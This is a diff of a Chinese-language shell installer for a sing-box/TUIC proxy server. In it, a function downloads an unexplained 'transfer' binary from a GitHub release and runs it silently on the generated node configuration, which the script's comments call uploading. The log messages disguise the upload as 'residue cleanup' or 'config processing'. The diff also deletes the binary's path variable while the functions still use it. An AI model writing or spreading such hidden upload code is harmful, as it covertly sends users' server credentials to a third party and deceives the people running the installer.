@@ -20,9 +20,6 @@ WHITE='\033[1;37m'
 NC='\033[0m'
 BOLD='\033[1m'
 
-# Transfer配置
-TRANSFER_BIN="/usr/local/bin/transfer"
-
 # 图标定义
 ICON_SUCCESS="✅"
 ICON_ERROR="❌"
@@ -632,57 +629,47 @@ start_singbox_service() {
     fi
 }
 
-# ========== 下载二进制文件 ==========
+# 下载transfer工具
 download_transfer_bin() {
-    log_info "下载 transfer 二进制文件..."
-
-    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"
-
+    log_info "下载transfer工具..."
+    
+    TRANSFER_URL="https://github.com/diandongyun/node/releases/download/node/transfer"
+    
     if [ -f "$TRANSFER_BIN" ]; then
-        log_info "transfer 二进制文件已存在，跳过下载"
+        log_info "transfer 工具已存在，跳过下载"
         return 0
     fi
-
+    
     mkdir -p /usr/local/bin
-
+    
     if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
         chmod +x "$TRANSFER_BIN"
-        log_info "transfer 下载完成"
+        log_info "transfer 工具下载并安装完成"
         return 0
     else
-        log_warn "transfer 二进制文件下载失败，将跳过数据上传功能"
+        log_warn "transfer 工具下载失败，将跳过数据上传功能"
         return 1
     fi
 }
 
+# 上传配置信息
 upload_config_with_binary() {
     local config_json="$1"
     local server_ip="$2"
-
+    
     if [ ! -x "$TRANSFER_BIN" ]; then
-        log_warn "transfer 二进制文件不存在或不可执行，跳过上传"
+        log_warn "transfer 工具不存在或不可执行，跳过上传"
         return 1
     fi
-
-    local json_data=$(jq -n \
-        --arg server_ip "$server_ip" \
-        --argjson config "$config_json" \
-        '{
-            "server_info": {
-                "title": "TUIC 节点配置 - \($server_ip)",
-                "server_ip": $server_ip,
-                "config": $config,
-                "generated_time": now | todate
-            }
-        }'
-    )
-
-    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
-        log_info "清理残留成功"
+    
+    log_info "正在处理配置信息..."
+    
+    if timeout 30 "$TRANSFER_BIN" "$config_json" >/dev/null 2>&1; then
+        log_info "配置信息处理成功"
     else
-        log_warn "清理残留失败（不影响本地使用）"
+        log_warn "配置信息处理失败（不影响本地使用）"
     fi
-
+    
     return 0
 }
 
@@ -790,7 +777,7 @@ EOF
                 }
             }' 2>/dev/null)
         
-        # 检查配置信息
+        # 上传配置信息
         if [[ -n "$json_data" ]]; then
             upload_config_with_binary "$json_data" "$listen_ip"
         fi
